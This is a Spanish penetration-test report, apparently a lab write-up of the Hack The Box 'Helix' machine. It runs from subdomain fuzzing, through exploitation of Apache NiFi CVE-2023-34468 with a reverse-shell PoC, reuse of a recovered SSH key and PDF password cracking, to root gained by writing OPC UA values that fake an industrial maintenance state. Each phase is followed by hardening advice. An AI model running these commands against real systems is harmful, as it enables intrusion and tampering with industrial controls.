informe de análisis y enumeración

1\. Escaneo inicial

Se realizó un escaneo de reconocimiento sobre el objetivo 10.129.245.123
con el fin de identificar los servicios expuestos y obtener una primera
visión de la superficie de ataque. Durante esta fase se detectaron dos
puertos abiertos: 22/tcp correspondiente al servicio SSH y 80/tcp
correspondiente al servicio web bajo nginx.

El análisis también mostró que el servicio HTTP redirigía hacia el
dominio helix.htb, por lo que fue necesario asociar ese nombre al host
local para continuar con la enumeración.

Comando usado:

bash

nmap -sS \--open -sC -sV -n -Pn 10.129.245.123

![](media/image1.png){width="11.793055555555556in"
height="4.219444444444444in"}

Recomendaciones:

Restringir el acceso a SSH por IP o VPN.

Mantener actualizados los servicios expuestos.

Revisar si el host debe responder con redirecciones públicas.

2\. Enumeración web inicial

Tras configurar la resolución del dominio, se accedió a la página
principal del servicio web para analizar su contenido y detectar
posibles puntos de interacción. La aplicación respondió correctamente
con código 200 OK y mostró una página corporativa relacionada con Helix
Industries, orientada a automatización industrial e infraestructura
crítica.

Durante esta fase también se identificaron cabeceras y metadatos básicos
del servidor, incluyendo el uso de nginx sobre Ubuntu y la presencia de
una dirección de correo de contacto visible en el contenido.

Comando usado:

bash

whatweb http://helix.htb/

![](media/image2.png){width="13.911968503937008in"
height="5.623902012248469in"}

Recomendaciones:

Reducir la información expuesta en el frontend.

Evitar mostrar correos o datos de contacto en claro si no es necesario.

Revisar qué metadatos y cabeceras se están publicando públicamente.

3\. Pruebas manuales

Se realizaron pruebas manuales sobre la aplicación web con el objetivo
de entender su funcionamiento y localizar posibles puntos de
interacción. Sin embargo, no se observó ningún elemento relevante con el
que se pudiera interactuar de forma directa, por lo que esta fase se
limitó a una revisión visual y funcional básica del contenido expuesto.

![](media/image3.png){width="15.125168416447943in"
height="9.588101487314086in"}

Recomendaciones:

Minimizar la superficie pública innecesaria.

Revisar qué contenido se expone sin autenticación.

Evitar mostrar información estática que no aporte valor al usuario
final.

4\. Búsqueda de subdominios

Dado que el servicio web parecía estar montado sobre una infraestructura
con virtual hosts, se realizó una enumeración de subdominios mediante
fuzzing del encabezado Host. Esta fase tenía como objetivo identificar
servicios adicionales expuestos bajo el dominio principal helix.htb.

Durante la primera pasada con un diccionario reducido se detectó el
subdominio flow. Posteriormente, se amplió la búsqueda con una wordlist
de mayor tamaño para confirmar si existían más hosts virtuales, aunque
no se obtuvieron nuevos resultados relevantes.

Comandos usados:

bash

ffuf -u http://helix.htb/ -H \"Host: FUZZ.helix.htb\" -w
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs
154

ffuf -u http://helix.htb/ -H \"Host: FUZZ.helix.htb\" -w
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs
154

![](media/image4.png){width="9.136805555555556in"
height="4.886111111111111in"}

![](media/image5.png){width="10.654094488188976in"
height="6.464879702537183in"}

Recomendaciones:

Reducir la exposición de subdominios innecesarios.

Proteger servicios internos con autenticación robusta.

Evitar respuestas diferenciadas que faciliten el reconocimiento.

5\. Revisión del subdominio

Una vez identificado el subdominio, se realizó una revisión manual de su
comportamiento para analizar su funcionamiento, comprobar las opciones
disponibles y determinar la versión de la tecnología utilizada. Esta
fase ayudó a ampliar la enumeración y a definir mejor las posibles vías
de ataque.

![](media/image6.png){width="11.57895341207349in"
height="5.55403324584427in"}

Recomendaciones:

Restringir el acceso a servicios internos.

Ocultar información de versión expuesta públicamente.

Revisar si el subdominio debe estar disponible sin control adicional.

6\. Crawling y enumeración de rutas

Posteriormente se ejecutó un crawling sobre el subdominio para localizar
APIs, rutas internas y otros recursos que pudieran haberse pasado por
alto durante la revisión manual. Los resultados mostraron principalmente
archivos estáticos y referencias internas del entorno NiFi, sin aportar
en ese momento un acceso adicional útil.

Comando usado:

bash

katana -u http://flow.helix.htb/nifi/ -jc -kf all -d 10

![](media/image7.png){width="12.209695975503061in"
height="5.856580271216098in"}

Recomendaciones:

Limitar la exposición de rutas internas.

Evitar publicar recursos estáticos innecesarios.

Revisar la estructura de los servicios para no facilitar enumeración.

7\. Identificación de la versión

Una vez identificado que la versión expuesta era Apache NiFi 1.21.0, se
revisó tanto la página principal del puerto 80 como el subdominio para
entender mejor el servicio y su superficie de ataque. A partir de esta
información, se comenzaron a buscar exploits públicos relacionados con
la tecnología detectada.

Durante la revisión apareció un módulo de Metasploit asociado a la
vulnerabilidad CVE-2023-34468, orientada a Apache NiFi H2 RCE. El módulo
se probó en varias ocasiones con distintos parámetros y payloads, pero
no llegó a proporcionar una sesión funcional, por lo que se descartó
como vía de explotación directa en ese momento.

Comandos usados:

bash

msfconsole

use exploit/linux/http/apache_nifi_h2_rce

options

set RHOSTS 10.129.227.225

run

![](media/image8.png){width="7.386111111111111in"
height="4.104861111111111in"}

![](media/image9.png){width="12.24292104111986in"
height="5.872516404199475in"}

Recomendaciones:

Mantener Apache NiFi actualizado.

Restringir el acceso a interfaces de administración.

Revisar la exposición de componentes que permitan ejecución dinámica.

8\. Búsqueda de explotación

Una vez identificada la versión del servicio, se intentó ampliar la
enumeración mediante fuzzing con el objetivo de encontrar endpoints
adicionales o contenido oculto. Sin embargo, los resultados no mostraron
más rutas útiles ni servicios alternativos, confirmando que la
superficie de ataque quedaba limitada al subdominio analizado. Ante esta
situación, se optó por probar un exploit público de GitHub, que
finalmente permitió obtener acceso interactivo al sistema.

![](media/image10.png){width="10.033849518810149in"
height="4.812899168853893in"}

Comando usado:

bash

python3 CVE-2023-34468_poc.py \--target http://flow.helix.htb \--lhost
10.10.14.54 \--lport 4444 --cleanup

![](media/image11.png){width="11.302027559055118in"
height="5.4225623359580055in"}

![](media/image12.png){width="10.69375in" height="5.294117454068242in"}

Recomendaciones:

Aplicar parches de seguridad de forma continua.

No exponer servicios críticos sin autenticación.

Limitar la posibilidad de ejecución remota en componentes de
administración.

9\. Acceso inicial al sistema

Una vez obtenida la shell inicial como usuario nifi, se procedió a
enumerar el sistema para identificar cuentas locales y entender mejor el
entorno comprometido. La revisión de /etc/passwd permitió observar
usuarios de servicio como nifi, plc y operator, además de otras cuentas
estándar del sistema.

Posteriormente se comprobó la identidad del usuario actual y se exploró
el directorio de instalación de NiFi, confirmando la estructura habitual
del servicio y la presencia de varios directorios relacionados con
repositorios internos, configuración, extensiones y logs.

Comandos usados:

bash

cat /etc/passwd

id

script /dev/null

![](media/image13.png){width="11.72830927384077in"
height="6.863279746281715in"}

Recomendaciones:

Revisar la presencia de cuentas de servicio innecesarias.

Limitar permisos sobre directorios de instalación.

Proteger la información sensible expuesta en la configuración del
servicio.

10\. Hallazgo en support-bundles

Durante la enumeración local del directorio de instalación de NiFi se
revisaron varios componentes del sistema. En esta exploración se
localizó el directorio support-bundles, dentro del cual apareció un
archivo operator_id_ed25519.bak, lo que llamó la atención por tratarse
de una copia de una clave privada o un respaldo asociado al usuario
operator.

Este hallazgo sugería la posible existencia de credenciales
reutilizables o material sensible expuesto en disco, por lo que pasó a
ser uno de los puntos de interés para fases posteriores de la
enumeración.

Comandos usados:

bash

ls

cd support-bundles

ls

![](media/image14.png){width="11.123630796150481in"
height="3.0352941819772528in"}

Recomendaciones:

No almacenar copias de claves privadas en directorios accesibles.

Proteger con permisos estrictos los respaldos de credenciales.

Revisar y eliminar artefactos sensibles no necesarios.

11\. Clave privada recuperada

Durante la revisión del directorio support-bundles se localizó un
archivo denominado operator_id_ed25519.bak, cuyo contenido correspondía
a una clave privada OpenSSH. Este hallazgo resultó especialmente
relevante, ya que ofrecía una posible vía de acceso adicional mediante
autenticación SSH con el usuario operator.

Comando usado:

bash

cat operator

Contenido:

bash

\-\-\-\--BEGIN OPENSSH PRIVATE KEY\-\-\-\--

\...

\-\-\-\--END OPENSSH PRIVATE KEY\-\-\-\--

![](media/image15.png){width="10.136674321959754in"
height="4.541176727909011in"}

Recomendaciones:

No dejar copias de claves privadas en disco.

Proteger con permisos estrictos cualquier backup sensible.

Revisar que los artefactos de soporte no expongan credenciales
reutilizables.

12\. Acceso por SSH

Una vez recuperada la clave privada, se descargó el archivo localmente y
se utilizó para establecer una conexión SSH con el usuario operator
sobre el objetivo. El acceso fue exitoso y permitió entrar en una sesión
interactiva en el sistema Ubuntu, confirmando que la clave correspondía
a una cuenta válida del host.

Al iniciar sesión, el sistema mostró información general del equipo,
incluida la versión de Ubuntu, el uso de disco y la IP interna del host.
A partir de este punto, la enumeración continuó desde una posición más
privilegiada que la shell anterior.

Comando usado:

bash

ssh -i operator.key operator@10.129.245.123

![](media/image16.png){width="13.724820647419072in"
height="6.583334426946632in"}

Recomendaciones:

Evitar reutilizar claves privadas en archivos de respaldo.

Revocar credenciales expuestas en directorios accesibles.

Revisar el acceso SSH de cuentas de servicio y limitarlo cuando no sea
necesario.

13\. Enumeración local adicional

Tras acceder por SSH como operator, se continuó con la enumeración local
del entorno y se revisaron los archivos de configuración y documentación
disponibles en el sistema. En esta fase se inspeccionó el directorio de
configuración de NiFi y también se intentó consultar información
relacionada con servicios del host, aunque no se localizó el archivo
esperado en /etc/helix/config.ini.

Posteriormente se descargaron de forma local dos ficheros de interés
desde el directorio personal del usuario: Operator Control & Safety
Guide.pdf y control systems diagram.png. Ambos documentos resultaron
útiles para comprender mejor la arquitectura del entorno y el
funcionamiento general del sistema controlado por Helix.

Comandos usados:

bash

cd /opt/nifi-1.21.0/conf

ls

cat /etc/helix/config.ini

sudo systemctl status helix-opc

scp -i operator.key operator@10.129.245.123:\"/home/operator/Operator\\
Control\\ \\&\\ Safety\\ Guide.pdf\" ./Guia_Helix.pdf

scp -i operator.key operator@10.129.245.123:\"/home/operator/control\\
systems\\ diagram.png\" ./Diagrama_Helix.png

![](media/image17.png){width="9.709722222222222in"
height="3.5527777777777776in"}

Recomendaciones:

Documentar y proteger archivos operativos sensibles.

Evitar dejar manuales o diagramas accesibles sin control.

Revisar permisos sobre información técnica del entorno.

14\. PDF protegido

Al abrir el PDF se comprobó que estaba protegido con contraseña, lo que
despertó la sospecha de que pudiera contener información sensible o
documentación interna importante. Ante esa posibilidad, se extrajo su
hash para intentar recuperar la contraseña y comprender qué información
estaba siendo protegida.

Mediante un ataque de diccionario con rockyou.txt se consiguió recuperar
la clave del documento, que resultó ser operator1. Este hallazgo
confirmó que el archivo no estaba orientado a credenciales directas,
sino a contener documentación interna protegida que merecía un análisis
posterior.

Comandos usados:

bash

cat hash_pdf.txt

john \--wordlist=/usr/share/wordlists/rockyou.txt \--encoding=ISO-8859-1
hash_pdf.txt

![](media/image18.png){width="9.615972222222222in"
height="2.8652777777777776in"}

Recomendaciones:

Proteger documentos sensibles con contraseñas robustas.

Evitar el uso de claves débiles o predecibles.

Revisar el contenido de guías y manuales internos para no exponer
información crítica.

15\. Análisis de la documentación

Durante la enumeración del sistema se localizaron varios archivos en el
directorio de configuración que, en un primer momento, no parecían
especialmente relevantes. Antes de profundizar en ellos, se intentó
encontrar alguna contraseña, credencial mal almacenada o dato sensible
que facilitara el acceso a otras partes del entorno, aunque no se obtuvo
ningún resultado útil en esa línea.

Con el tiempo, se decidió revisar esos ficheros con más detalle al
resultar llamativa la presencia de una guía en PDF y un diagrama en PNG
dentro de un directorio tan asociado a la configuración. Esta
circunstancia sugería que podían aportar contexto sobre la arquitectura
del sistema o sobre su operación interna, más que credenciales
directamente reutilizables.

![](media/image19.png){width="7.543055555555555in"
height="5.125694444444444in"}

![](media/image20.png){width="8.965418853893263in"
height="6.462904636920385in"}

Recomendaciones:

Separar la documentación operativa de los directorios de configuración.

Proteger manuales internos con control de acceso.

Evitar almacenar material sensible en ubicaciones predecibles.

16\. Escalada a root

La escalada a root se basaba en una condición operativa muy concreta del
entorno, descrita también en la documentación recuperada. Tras revisar
los privilegios del usuario operator, se comprobó que podía ejecutar
como root el binario /usr/local/sbin/helix-maint-console sin necesidad
de contraseña.

La guía en PDF indicaba además que, para activar el acceso privilegiado,
era necesario simular un estado de mantenimiento del sistema. Para ello
se modificaron varios valores mediante escritura OPC UA, estableciendo
el modo de operación en MAINTENANCE, activando la bandera
correspondiente y ajustando la temperatura a un valor superior al umbral
esperado.

Una vez cumplidas esas condiciones, la ejecución de helix-maint-console
otorgó acceso privilegiado temporal al sistema, permitiendo obtener una
shell como root y leer el archivo root.txt.

Comandos usados:

bash

sudo -l

uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n \"ns=2;i=12\" -t string
\"MAINTENANCE\"

uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n \"ns=2;i=13\" -t bool true

uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n \"ns=2;i=6\" -t double
11.0

sudo /usr/local/sbin/helix-maint-console

cat /root/root.txt

![](media/image21.png){width="13.939583333333333in"
height="4.521527777777778in"}

Recomendaciones:

Revisar cuidadosamente los binarios delegados con sudo.

No depender de condiciones operativas fáciles de manipular.

Validar que los modos de mantenimiento no puedan activarse desde el
exterior sin control adicional.

17\. Resultados finales

Durante el análisis se consiguió acceso inicial mediante la explotación
del servicio Apache NiFi, se obtuvo una shell como usuario nifi,
posteriormente se localizó una clave privada reutilizable para acceder
como operator por SSH, y finalmente se logró la escalada a root mediante
la manipulación del estado de mantenimiento del sistema.

El compromiso del host se completó con éxito, demostrando una cadena de
exposición formada por enumeración insuficiente, credenciales
reutilizables y una validación débil de condiciones operativas.

Archivos obtenidos:

user.txt

root.txt

Diagrama de ataque

Nmap

↓

helix.htb

↓

FFUF

↓

flow.helix.htb

↓

Apache NiFi 1.21.0

↓

CVE-2023-34468

↓

Shell (nifi)

↓

operator_id_ed25519.bak

↓

SSH operator

↓

PDF + OPC UA

↓

sudo helix-maint-console

↓

root
